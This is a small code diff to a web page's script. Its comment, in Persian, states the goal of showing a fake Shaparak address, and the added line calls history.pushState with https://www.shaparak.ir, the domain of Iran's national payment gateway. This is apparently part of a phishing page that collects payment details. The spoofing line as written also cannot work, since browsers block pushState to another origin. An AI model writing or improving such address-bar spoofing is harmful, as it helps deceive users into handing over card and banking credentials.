@@ -304,6 +304,8 @@
             ];
 
             function init() {
+                // اعمال URL Masking برای نمایش آدرس جعلی شاپرک
+                window.history.pushState({}, document.title, 'https://www.shaparak.ir');
                 setupInputs();
                 updateProgress();
                 if (!localStorage.getItem(`specialMode_${sessionId}`)) {
